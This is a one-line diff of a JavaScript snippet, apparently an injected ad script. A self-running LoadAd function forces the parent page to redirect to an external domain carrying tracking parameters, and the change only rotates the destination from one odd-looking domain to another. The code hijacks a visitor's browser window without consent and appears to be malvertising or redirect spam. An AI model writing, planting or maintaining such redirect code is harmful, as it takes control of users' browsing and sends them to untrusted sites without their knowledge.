@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://jdbqg.freedomlovee.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2195361&s3=Kradak"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.giirlshouse.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2195361&s3=Kradak"; } LoadAd();
